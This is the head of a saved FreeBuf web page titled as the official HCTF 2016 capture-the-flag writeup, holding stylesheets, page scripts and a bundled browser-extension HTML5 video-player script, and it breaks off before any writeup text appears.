<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0047)http://www.freebuf.com/articles/web/121778.html -->
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>
  HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="*本文原创作者：sysorem，本文属FreeBuf原创奖励计划，未经许可禁止转载 
    
    
2016年11月25日20:00 – 2016年11月27日20:00，历时48小时，第八届HCTF网络安全对抗赛正式完结。本次比赛由Vidar-Team全程…">
<meta name="keywords" content="HCTF">
<meta name="baidu-site-verification" content="nKKKqQxp6R">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375">
<link rel="stylesheet" id="wpfp-css" href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/wpfp.css" type="text/css">
<link rel="stylesheet" id="wp-recentcomments-css" href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/wp-recentcomments.css" type="text/css" media="screen">
<link rel="stylesheet" id="mycred-widget-css" href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/widget.css" type="text/css" media="all">
<script type="text/javascript" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/jquery.min.js"></script><style type="text/css" adt="123"></style>
<script type="text/javascript" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/wpfp.js"></script>
<link rel="prev" title="专家观点：不建议在SCADA系统中部署防火墙" href="http://www.freebuf.com/articles/security-management/121663.html">
<link rel="canonical" href="http://www.freebuf.com/articles/web/121778.html">
<link rel="shortlink" href="http://www.freebuf.com/?p=121778">

<link rel="stylesheet" href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/highslide.css" type="text/css">
<script type="text/javascript" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/script.js"></script>
      <link rel="stylesheet" type="text/css" href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/style.css">
      <script type="text/javascript" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/default.css">	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico">
<link rel="stylesheet" href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/header.css">
<link href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/bootstrap.min.css" rel="stylesheet" media="screen">
<link href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/style(1).css" rel="stylesheet" type="text/css">
<style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/jquery-2.0.3.min.js"></script>
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/bootstrap.min.js"></script>
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/slider.js" type="text/javascript"></script>
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/jquery.sticky.js" type="text/javascript"></script>
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/bjqs-1.3.min.js" type="text/javascript"></script>
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/mosaic.1.0.1.min.js" type="text/javascript"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/share.js"></script><style type="text/css">.highslide img {cursor: url(http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/zoomin.cur), pointer !important;}.highslide-viewport-size {position: fixed; width: 100%; height: 100%; left: 0; top: 0}</style><script>!
    function e(t, n, i) {
        function o(a, s) {
            if (!n[a]) {
                if (!t[a]) {
                    var l = "function" == typeof require && require;
                    if (!s && l) return l(a, !0);
                    if (r) return r(a, !0);
                    var c = new Error("Cannot find module '" + a + "'");
                    throw c.code = "MODULE_NOT_FOUND",
                        c
                }
                var d = n[a] = {
                    exports: {}
                };
                t[a][0].call(d.exports, function (e) {
                    var n = t[a][1][e];
                    return o(n ? n : e)
                }, d, d.exports, e, t, n, i)
            }
            return n[a].exports
        }
        for (var r = "function" == typeof require && require, a = 0; a < i.length; a++) o(i[a]);
        return o
    }({
        1: [function (e) {
            var t = window.location.href,
                n = document.createElement("div"),
                i = document.createElement("i");
            if (i.setAttribute("id", "ADT-PlayHTML5-btn"), i.innerText = "HTML5\u89c6\u9891", i.setAttribute("style", "display:inline-block;font-size: 20px;padding:5px 10px;font-weight: 700;line-height:34px;color: #fff;text-align: center;vertical-align: baseline;border-radius:10px;background-color: #428bca;cursor: pointer;font-style: normal;"), n.setAttribute("style", "float:right;margin-top:-50px;width:300px;height:50px;padding-top:8px;"), n.appendChild(i), /v\.youku\.com\/v_show\/.*/.test(t)) document.querySelector(".s_main div.base").appendChild(n);
            else if (/www\.tudou\.com\/(albumplay|programs)\/.*/.test(t)) document.querySelector("#summary").appendChild(n);
            else if (/www\.mgtv\.com\/v\/.*/.test(t)) {
                var i = document.createElement("i"),
                    o = document.createElement("div"),
                    r = document.createElement("em");
                i.setAttribute("style", "display:inline-block;margin:auto 20px;cursor:pointer;"),
                    i.innerText = "HTML5\u89c6\u9891",
                    r.innerText = "|",
                    r.setAttribute("class", "v-panel-dividing"),
                    o.setAttribute("style", "margin-right: 10px;height: 28px;overflow: hidden;position: relative;top: -1px;float: left;"),
                    o.appendChild(r),
                    o.appendChild(i),
                    document.querySelector("div.v-panel-box").appendChild(o)
            }
            i.addEventListener("click", function () {
                function t(e, t) {
                    if (!e) return console.log("\u89e3\u6790\u5185\u5bb9\u5730\u5740\u5931\u8d25"),
                        void delete window[s];
                    console.log("\u89e3\u6790\u5185\u5bb9\u5730\u5740\u5b8c\u6210" + e.map(function (e) {
                            return '<a href="' + e[1] + '" target="_blank">' + e[0] + "</a>"
                        }).join(" "));
                    var n = o("div", {
                        appendTo: document.body,
                        style: {
                            position: "fixed",
                            background: "rgba(0,0,0,0.8)",
                            top: "0",
                            left: "0",
                            width: "100%",
                            height: "100%",
                            zIndex: "999999"
                        }
                    });
                    o("div", {
                        appendTo: n,
                        style: {
                            width: "1120px",
                            height: "630px",
                            position: "absolute",
                            top: "40%",
                            left: "50%",
                            marginTop: "-250px",
                            marginLeft: "-560px",
                            borderRadius: "2px",
                            boxShadow: "0 0 2px #000000, 0 0 200px #000000"
                        }
                    }),
                        o("div", {
                            appendTo: n,
                            style: {
                                position: "absolute",
                                bottom: "10px",
                                left: "0",
                                right: "0",
                                height: "20px",
                                lineHeight: "20px",
                                textAlign: "center",
                                fontSize: "12px",
                                fontFamily: "arial, sans-serif"
                            }
                        });
                    var a = o("div", {
                        appendTo: n,
                        innerHTML: '<div id="html5_Player_placeHolder"></div>',
                        style: {
                            width: "1120px",
                            height: "630px",
                            position: "absolute",
                            backgroundColor: "#000000",
                            top: "40%",
                            left: "50%",
                            marginTop: "-250px",
                            marginLeft: "-560px",
                            borderRadius: "2px",
                            overflow: "hidden"
                        }
                    });
                    o("div", {
                        appendTo: a,
                        innerHTML: "&times;",
                        style: {
                            width: "20px",
                            height: "20px",
                            lineHeight: "20px",
                            textAlign: "center",
                            position: "absolute",
                            color: "#ffffff",
                            fontSize: "20px",
                            top: "5px",
                            right: "5px",
                            textShadow: "0 0 2px #000000",
                            fontWeight: "bold",
                            fontFamily: 'Garamond, "Apple Garamond"',
                            cursor: "pointer"
                        }
                    }).onclick = function () {
                        document.body.removeChild(n),
                            l.video.src = "about:blank",
                            delete window[s]
                    };
                    var l = new r("html5_Player_placeHolder", "1120x630", e, t);
                    l.iframe.contentWindow.focus(),
                        i(),
                        l.iframe.style.display = "block",
                        window[s] = !0
                }
                var n, i = e("./flashBlocker"),
                    o = e("./createElement"),
                    r = e("./player"),
                    a = e("./purl"),
                    s = e("./h5key"),
                    l = e("./seekers");
                if (1 != window[s]) {
                    var c = a(location.href);
                    "zythum.sinaapp.com" === c.attr("host") && "/mama2/ps4/" === c.attr("directory") && c.param("url") && (c = a(c.param("url"))),
                        l.forEach(function (e) {
                            n !== !0 && !! e.match(c) == !0 && (console.log("\u5f00\u59cb\u89e3\u6790\u5185\u5bb9\u5730\u5740"), n = !0, e.getVideos(c, t))
                        }),
                    void 0 === n && console.log("\u627e\u4e0d\u5230\u89e3\u6790")
                }
            })
        },
            {
                "./createElement": 4,
                "./flashBlocker": 5,
                "./h5key": 6,
                "./player": 9,
                "./purl": 10,
                "./seekers": 15
            }],
        2: [function (e, t) {
            function n(e, t) {
                return void 0 === e ? t : e
            }
            function i(e, t) {
                return 0 === t.length ? e : e + (-1 === e.indexOf("?") ? "?" : "&") + t
            }
            function o(e) {
                var t = n(e.url, ""),
                    o = s(n(e.param, {})),
                    l = n(e.method, "GET"),
                    c = n(e.callback, a),
                    d = n(e.contentType, "json"),
                    u = n(e.context, null);
                if (e.jsonp) return r(i(t, o), c.bind(u), "string" == typeof e.jsonp ? e.jsonp : void 0);
                var h = new XMLHttpRequest;
                "get" === l.toLowerCase() && (t = i(t, o), o = ""),
                    h.open(l, t, !0),
                    h.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"),
                    h.send(o),
                    h.onreadystatechange = function () {
                        if (4 === h.readyState) {
                            if (200 === h.status) {
                                var e = h.responseText;
                                if ("json" === d.toLowerCase()) try {
                                    e = JSON.parse(e)
                                } catch (t) {
                                    e = -1
                                }
                                return c.call(u, e)
                            }
                            return c.call(u, -1)
                        }
                    }
            }
            var r = e("./jsonp"),
                a = e("./noop"),
                s = e("./queryString");
            t.exports = o
        },
            {
                "./jsonp": 7,
                "./noop": 8,
                "./queryString": 11
            }],
        3: [function (e, t) {
            t.exports = !! document.createElement("video").canPlayType("application/x-mpegURL")
        },
            {}],
        4: [function (e, t) {
            function n(e, t) {
                var n = document.createElement(e);
                if ("function" == typeof t) t.call(n);
                else for (var i in t) if (t.hasOwnProperty(i)) switch (i) {
                    case "appendTo":
                        t[i].appendChild(n);
                        break;
                    case "innerHTML":
                    case "className":
                    case "id":
                        n[i] = t[i];
                        break;
                    case "style":
                        var o = t[i];
                        for (var r in o) o.hasOwnProperty(r) && (n.style[r] = o[r]);
                        break;
                    default:
                        n.setAttribute(i, t[i] + "")
                }
                return n
            }
            t.exports = n
        },
            {}],
        5: [function (e, t) {
            var n = '<div style="text-shadow:0 0 2px #eee;letter-spacing:-1px;background:#eee;font-weight:bold;padding:0;font-family:arial,sans-serif;font-size:30px;color:#ccc;width:152px;height:52px;border:4px solid #ccc;border-radius:12px;position:absolute;top:50%;left:50%;margin:-30px 0 0 -80px;text-align:center;line-height:52px;">Flash</div>',
                i = 0,
                o = {},
                r = function () {
                    var e = this.getAttribute("data-flash-index"),
                        t = o[e];
                    t.setAttribute("data-flash-show", "isshow"),
                        this.parentNode.insertBefore(t, this),
                        this.parentNode.removeChild(this),
                        this.removeEventListener("click", r, !1)
                },
                a = function (e, t, a) {
                    var s = i++,
                        l = document.defaultView.getComputedStyle(e, null),
                        c = l.position;
                    c = "static" === c ? "relative" : c;
                    var d = l.margin,
                        u = "inline" == l.display ? "inline-block" : l.display,
                        l = ["", "width:" + t + "px", "height:" + a + "px", "position:" + c, "margin:" + d, "display:" + u, "margin:0", "padding:0", "border:0", "border-radius:1px", "cursor:pointer", "background:-webkit-linear-gradient(top, rgba(240,240,240,1)0%,rgba(220,220,220,1)100%)", ""];
                    o[s] = e;
                    var h = document.createElement("div");
                    return h.setAttribute("title", "&#x70B9;&#x6211;&#x8FD8;&#x539F;Flash"),
                        h.setAttribute("data-flash-index", "" + s),
                        e.parentNode.insertBefore(h, e),
                        e.parentNode.removeChild(e),
                        h.addEventListener("click", r, !1),
                        h.style.cssText += l.join(";"),
                        h.innerHTML = n,
                        h
                },
                s = function (e) {
                    if (e instanceof HTMLObjectElement) {
                        if ("" == e.innerHTML.trim()) return;
                        if (e.getAttribute("classid") && !/^java:/.test(e.getAttribute("classid"))) return
                    } else if (!(e instanceof HTMLEmbedElement)) return;
                    var t = e.offsetWidth,
                        n = e.offsetHeight;
                    t > 160 && n > 60 && a(e, t, n)
                };
            t.exports = function () {
                for (var e = document.getElementsByTagName("embed"), t = document.getElementsByTagName("object"), n = 0, i = t.length; i > n; n++) t[n] && s(t[n]);
                for (var n = 0, i = e.length; i > n; n++) e[n] && s(e[n])
            }
        },
            {}],
        6: [function (e, t) {
            t.exports = "html5playerforadblockyouknowwhatimean"
        },
            {}],
        7: [function (e, t) {
            function n() {
                return a + s++
            }
            function i(e, t, i) {
                i = i || "callback";
                var a = n();
                window[a] = function (e) {
                    clearTimeout(s),
                        window[a] = r,
                        t(e),
                        document.body.removeChild(c)
                };
                var s = setTimeout(function () {
                        window[a](-1)
                    }, l),
                    c = o("script", {
                        appendTo: document.body,
                        src: e + (e.indexOf("?") >= 0 ? "&" : "?") + i + "=" + a
                    })
            }
            var o = e("./createElement"),
                r = e("./noop"),
                a = "MAMA2_HTTP_JSONP_CALLBACK",
                s = 0,
                l = 1e4;
            t.exports = i
        },
            {
                "./createElement": 4,
                "./noop": 8
            }],
        8: [function (e, t) {
            t.exports = function () {}
        },
            {}],
        9: [function (e, t) {
            var n;
            !
                function i(t, n, o) {
                    function r(s, l) {
                        if (!n[s]) {
                            if (!t[s]) {
                                var c = "function" == typeof e && e;
                                if (!l && c) return c(s, !0);
                                if (a) return a(s, !0);
                                throw new Error("Cannot find module '" + s + "'")
                            }
                            var d = n[s] = {
                                exports: {}
                            };
                            t[s][0].call(d.exports, function (e) {
                                var n = t[s][1][e];
                                return r(n ? n : e)
                            }, d, d.exports, i, t, n, o)
                        }
                        return n[s].exports
                    }
                    for (var a = "function" == typeof e && e, s = 0; s < o.length; s++) r(o[s]);
                    return r
                }({
                    1: [function (e, t) {
                        function n(e) {
                            for (var t = [], n = 1; n < arguments.length; n++) {
                                var o = arguments[n],
                                    r = o.init;
                                t.push(r),
                                    delete o.init,
                                    i(e.prototype, o)
                            }
                            e.prototype.init = function () {
                                t.forEach(function (e) {
                                    e.call(this)
                                }.bind(this))
                            }
                        }
                        var i = e("./extend");
                        t.exports = n
                    },
                        {
                            "./extend": 9
                        }],
                    2: [function (e, t) {
                        var n = e("./player.css"),
                            i = e("./player.html"),
                            o = (e("./extend"), e("./createElement")),
                            r = e("./parseDOMByClassNames");
                        t.exports = {
                            init: function () {
                                var e = function () {
                                        var e = this.iframe.contentDocument.getElementsByTagName("head")[0],
                                            t = this.iframe.contentDocument.body;
                                        o("style", function () {
                                            e.appendChild(this);
                                            try {
                                                this.styleSheet.cssText = n
                                            } catch (t) {
                                                this.appendChild(document.createTextNode(n))
                                            }
                                        }),
                                            o("link", {
                                                appendTo: e,
                                                href: "http://libs.cncdn.cn/font-awesome/4.3.0/css/font-awesome.min.css",
                                                rel: "stylesheet",
                                                type: "text/css"
                                            }),
                                            t.innerHTML = i,
                                            this.DOMs = r(t, ["player", "video", "video-frame", "comments", "comments-btn", "play", "progress_anchor", "buffered_anchor", "fullscreen", "allscreen", "hd", "volume_anchor", "current", "duration"]),
                                            this.video = this.DOMs.video
                                    }.bind(this),
                                    t = document.getElementById(this.id),
                                    a = this.iframe = o("iframe", {
                                        allowTransparency: !0,
                                        frameBorder: "no",
                                        scrolling: "no",
                                        src: "about:blank",
                                        mozallowfullscreen: "mozallowfullscreen",
                                        webkitallowfullscreen: "webkitallowfullscreen",
                                        allowfullscreen: "allowfullscreen",
                                        style: {
                                            width: this.size[0] + "px",
                                            height: this.size[1] + "px",
                                            overflow: "hidden"
                                        }
                                    });
                                t && t.parentNode ? (t.parentNode.replaceChild(a, t), e()) : (document.body.appendChild(a), e(), document.body.removeChild(a))
                            }
                        }
                    },
                        {
                            "./createElement": 7,
                            "./extend": 9,
                            "./parseDOMByClassNames": 11,
                            "./player.css": 12,
                            "./player.html": 13
                        }],
                    3: [function (e, t) {
                        function n(e) {
                            e.strokeStyle = "black",
                                e.lineWidth = 3,
                                e.font = 'bold 20px "PingHei","Lucida Grande", "Lucida Sans Unicode", "STHeiti", "Helvetica","Arial","Verdana","sans-serif"'
                        }
                        var i = (e("./createElement"), .1),
                            o = 25,
                            r = 4e3,
                            a = document.createElement("canvas").getContext("2d");
                        n(a);
                        var s = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame ||
                            function (e) {
                                setTimeout(e, 1e3 / 60)
                            };
                        t.exports = {
                            init: function () {
                                this.video.addEventListener("play", this.reStartComment.bind(this)),
                                    this.video.addEventListener("pause", this.pauseComment.bind(this)),
                                    this.lastCommnetUpdateTime = 0,
                                    this.lastCommnetIndex = 0,
                                    this.commentLoopPreQueue = [],
                                    this.commentLoopQueue = [],
                                    this.commentButtonPreQueue = [],
                                    this.commentButtonQueue = [],
                                    this.commentTopPreQueue = [],
                                    this.commentTopQueue = [],
                                    this.drawQueue = [],
                                    this.preRenders = [],
                                    this.preRenderMap = {},
                                    this.enableComment = void 0 === this.comments ? !1 : !0,
                                    this.prevDrawCanvas = document.createElement("canvas"),
                                    this.canvas = this.DOMs.comments.getContext("2d"),
                                this.comments && this.DOMs.player.classList.add("has-comments"),
                                    this.DOMs["comments-btn"].classList.add("enable"),
                                    this.DOMs.comments.display = this.enableComment ? "block" : "none";
                                var e = 0,
                                    t = function () {
                                        (e = ~e) && this.onCommentTimeUpdate(),
                                            s(t)
                                    }.bind(this);
                                t()
                            },
                            needDrawText: function (e, t, n) {
                                this.drawQueue.push([e, t, n])
                            },
                            drawText: function () {
                                var e = this.prevDrawCanvas,
                                    t = this.prevDrawCanvas.getContext("2d");
                                e.width = this.canvasWidth,
                                    e.height = this.canvasHeight,
                                    t.clearRect(0, 0, this.canvasWidth, this.canvasHeight);
                                var i = [];
                                this.preRenders.forEach(function (e, t) {
                                    e.used = !1,
                                    void 0 === e.cid && i.push(t)
                                });
                                for (var r; r = this.drawQueue.shift();)!
                                    function (e, r) {
                                        var a, s = e[0].text + e[0].color,
                                            l = r.preRenderMap[s];
                                        if (void 0 === l) {
                                            var l = i.shift();
                                            void 0 === l ? (a = document.createElement("canvas"), l = r.preRenders.push(a) - 1) : a = r.preRenders[l];
                                            var c = a.width = e[0].width,
                                                d = a.height = o + 10,
                                                u = a.getContext("2d");
                                            u.clearRect(0, 0, c, d),
                                                n(u),
                                                u.fillStyle = e[0].color,
                                                u.strokeText(e[0].text, 0, o),
                                                u.fillText(e[0].text, 0, o),
                                                a.cid = s,
                                                r.preRenderMap[s] = l
                                        } else a = r.preRenders[l];
                                        a.used = !0,
                                            t.drawImage(a, e[1], e[2])
                                    }(r, this);
                                this.preRenders.forEach(function (e) {
                                    e.used === !1 && (delete this.preRenderMap[e.cid], e.cid = void 0)
                                }.bind(this)),
                                    this.canvas.clearRect(0, 0, this.canvasWidth, this.canvasHeight),
                                    this.canvas.drawImage(e, 0, 0)
                            },
                            createComment: function (e, t) {
                                if (void 0 === e) return !1;
                                var n = a.measureText(e.text);
                                return {
                                    startTime: t,
                                    text: e.text,
                                    color: e.color,
                                    width: n.width + 20
                                }
                            },
                            commentTop: function (e, t, n) {
                                this.commentTopQueue.forEach(function (t, i) {
                                    void 0 != t && (n > t.startTime + r ? this.commentTopQueue[i] = void 0 : this.needDrawText(t, (e - t.width) / 2, o * i))
                                }.bind(this));
                                for (var i; i = this.commentTopPreQueue.shift();) i = this.createComment(i, n),
                                    this.commentTopQueue.forEach(function (t, n) {
                                        i && void 0 === t && (t = this.commentTopQueue[n] = i, this.needDrawText(t, (e - i.width) / 2, o * n), i = void 0)
                                    }.bind(this)),
                                i && (this.commentTopQueue.push(i), this.needDrawText(i, (e - i.width) / 2, o * this.commentTopQueue.length - 1))
                            },
                            commentBottom: function (e, t, n) {
                                t -= 10,
                                    this.commentButtonQueue.forEach(function (i, a) {
                                        void 0 != i && (n > i.startTime + r ? this.commentButtonQueue[a] = void 0 : this.needDrawText(i, (e - i.width) / 2, t - o * (a + 1)))
                                    }.bind(this));
                                for (var i; i = this.commentButtonPreQueue.shift();) i = this.createComment(i, n),
                                    this.commentButtonQueue.forEach(function (n, r) {
                                        i && void 0 === n && (n = this.commentButtonQueue[r] = i, this.needDrawText(n, (e - i.width) / 2, t - o * (r + 1)), i = void 0)
                                    }.bind(this)),
                                i && (this.commentButtonQueue.push(i), this.needDrawText(i, (e - i.width) / 2, t - o * this.commentButtonQueue.length))
                            },
                            commentLoop: function (e, t, n) {
                                for (var r = t / o | 0, a = -1; ++a < r;) {
                                    var s = this.commentLoopQueue[a];
                                    if (void 0 === s && (s = this.commentLoopQueue[a] = []), this.commentLoopPreQueue.length > 0) {
                                        var l = 0 === s.length ? void 0 : s[s.length - 1];
                                        if (void 0 === l || (n - l.startTime) * i > l.width) {
                                            var c = this.createComment(this.commentLoopPreQueue.shift(), n);
                                            c && s.push(c)
                                        }
                                    }
                                    this.commentLoopQueue[a] = s.filter(function (t) {
                                        var r = (n - t.startTime) * i;
                                        return 0 > r || r > t.width + e ? !1 : (this.needDrawText(t, e - r, o * a), !0)
                                    }.bind(this))
                                }
                                for (var d = this.commentLoopQueue.length - r; d-- > 0;) this.commentLoopQueue.pop()
                            },
                            pauseComment: function () {
                                this.pauseCommentAt = Date.now()
                            },
                            reStartComment: function () {
                                if (this.pauseCommentAt) {
                                    var e = Date.now() - this.pauseCommentAt;
                                    this.commentLoopQueue.forEach(function (t) {
                                        t.forEach(function (t) {
                                            t && (t.startTime += e)
                                        })
                                    }),
                                        this.commentButtonQueue.forEach(function (t) {
                                            t && (t.startTime += e)
                                        }),
                                        this.commentTopQueue.forEach(function (t) {
                                            t && (t.startTime += e)
                                        })
                                }
                                this.pauseCommentAt = void 0
                            },
                            drawComment: function () {
                                if (!this.pauseCommentAt) {
                                    var e = Date.now(),
                                        t = this.DOMs["video-frame"].offsetWidth,
                                        n = this.DOMs["video-frame"].offsetHeight;
                                    t != this.canvasWidth && (this.DOMs.comments.width = t, this.canvasWidth = t),
                                    n != this.canvasHeight && (this.DOMs.comments.height = n, this.canvasHeight = n);
                                    var i = this.video.offsetWidth,
                                        o = this.video.offsetHeight;
                                    this.commentLoop(i, o, e),
                                        this.commentTop(i, o, e),
                                        this.commentBottom(i, o, e),
                                        this.drawText()
                                }
                            },
                            onCommentTimeUpdate: function () {
                                if (this.enableComment !== !1) {
                                    var e = this.video.currentTime;
                                    if (Math.abs(e - this.lastCommnetUpdateTime) <= 1 && e > this.lastCommnetUpdateTime) {
                                        var t = 0;
                                        for (this.lastCommnetIndex && this.comments[this.lastCommnetIndex].time <= this.lastCommnetUpdateTime && (t = this.lastCommnetIndex); ++t < this.comments.length;) if (!(this.comments[t].time <= this.lastCommnetUpdateTime)) {
                                            if (this.comments[t].time > e) break;
                                            switch (this.comments[t].pos) {
                                                case "bottom":
                                                    this.commentButtonPreQueue.push(this.comments[t]);
                                                    break;
                                                case "top":
                                                    this.commentTopPreQueue.push(this.comments[t]);
                                                    break;
                                                default:
                                                    this.commentLoopPreQueue.push(this.comments[t])
                                            }
                                            this.lastCommnetIndex = t
                                        }
                                    }
                                    try {
                                        this.drawComment()
                                    } catch (n) {}
                                    this.lastCommnetUpdateTime = e
                                }
                            }
                        }
                    },
                        {
                            "./createElement": 7
                        }],
                    4: [function (e, t) {
                        function n(e) {
                            return Array.prototype.slice.call(e)
                        }
                        function i(e, t, n, i) {
                            function o(t) {
                                var n = (t.clientX - e.parentNode.getBoundingClientRect().left) / e.parentNode.offsetWidth;
                                return Math.min(Math.max(n, 0), 1)
                            }
                            function r(t) {
                                1 == t.which && (l = !0, e.draging = !0, a(t))
                            }
                            function a(e) {
                                if (1 == e.which && l === !0) {
                                    var t = o(e);
                                    n(t)
                                }
                            }
                            function s(t) {
                                if (1 == t.which && l === !0) {
                                    var r = o(t);
                                    n(r),
                                        i(r),
                                        l = !1,
                                        delete e.draging
                                }
                            }
                            var l = !1;
                            n = n ||
                                function () {},
                                i = i ||
                                    function () {},
                                e.parentNode.addEventListener("mousedown", r),
                                t.addEventListener("mousemove", a),
                                t.addEventListener("mouseup", s)
                        }
                        var o = (e("./createElement"), e("./delegateClickByClassName")),
                            r = e("./timeFormat");
                        t.exports = {
                            init: function () {
                                var e = this.iframe.contentDocument,
                                    t = o(e);
                                t.on("play", this.onPlayClick, this),
                                    t.on("video-frame", this.onVideoClick, this),
                                    t.on("source", this.onSourceClick, this),
                                    t.on("allscreen", this.onAllScreenClick, this),
                                    t.on("fullscreen", this.onfullScreenClick, this),
                                    t.on("normalscreen", this.onNormalScreenClick, this),
                                    t.on("comments-btn", this.oncommentsBtnClick, this),
                                    t.on("airplay", this.onAirplayBtnClick, this),
                                    e.documentElement.addEventListener("keydown", this.onKeyDown.bind(this), !1),
                                    this.DOMs.player.addEventListener("mousemove", this.onMouseActive.bind(this)),
                                    i(this.DOMs.progress_anchor, e, this.onProgressAnchorWillSet.bind(this), this.onProgressAnchorSet.bind(this)),
                                    i(this.DOMs.volume_anchor, e, this.onVolumeAnchorWillSet.bind(this))
                            },
                            onKeyDown: function (e) {
                                switch (e.preventDefault(), e.keyCode) {
                                    case 32:
                                        this.onPlayClick();
                                        break;
                                    case 39:
                                        this.video.currentTime = Math.min(this.video.duration, this.video.currentTime + 10);
                                        break;
                                    case 37:
                                        this.video.currentTime = Math.max(0, this.video.currentTime - 10);
                                        break;
                                    case 38:
                                        this.video.volume = Math.min(1, this.video.volume + .1),
                                            this.DOMs.volume_anchor.style.width = 100 * this.video.volume + "%";
                                        break;
                                    case 40:
                                        this.video.volume = Math.max(0, this.video.volume - .1),
                                            this.DOMs.volume_anchor.style.width = 100 * this.video.volume + "%";
                                        break;
                                    case 65:
                                        this.DOMs.player.classList.contains("allscreen") ? this.onNormalScreenClick() : this.onAllScreenClick();
                                        break;
                                    case 70:
                                        this.DOMs.player.classList.contains("fullscreen") || this.onfullScreenClick()
                                }
                            },
                            onVideoClick: function () {
                                void 0 == this.videoClickDblTimer ? this.videoClickDblTimer = setTimeout(function () {
                                    this.videoClickDblTimer = void 0,
                                        this.onPlayClick()
                                }.bind(this), 300) : (clearTimeout(this.videoClickDblTimer), this.videoClickDblTimer = void 0, document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement ? this.onNormalScreenClick() : this.onfullScreenClick())
                            },
                            onMouseActive: function () {
                                this.DOMs.player.classList.add("active"),
                                    clearTimeout(this.MouseActiveTimer),
                                    this.MouseActiveTimer = setTimeout(function () {
                                        this.DOMs.player.classList.remove("active")
